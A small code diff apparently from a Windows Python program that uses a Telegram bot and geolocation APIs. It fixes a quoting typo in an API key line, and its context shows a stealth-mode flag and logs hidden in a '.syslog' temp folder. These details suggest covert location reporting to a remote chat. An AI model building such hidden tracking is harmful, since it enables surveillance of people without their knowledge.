@@ -21,7 +21,7 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 TELEGRAM_BOT_TOKEN = "xxxx"
 YOUR_TELEGRAM_CHAT_ID = "xxxx"
 OPENCAGE_API_KEY = "xxxx"
-LOCATIONIQ_API_KEY = xxxx"
+LOCATIONIQ_API_KEY = "xxxx"
 ENABLE_STEALTH_MODE = True
 def setup_logging():
     log_dir = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.syslog')
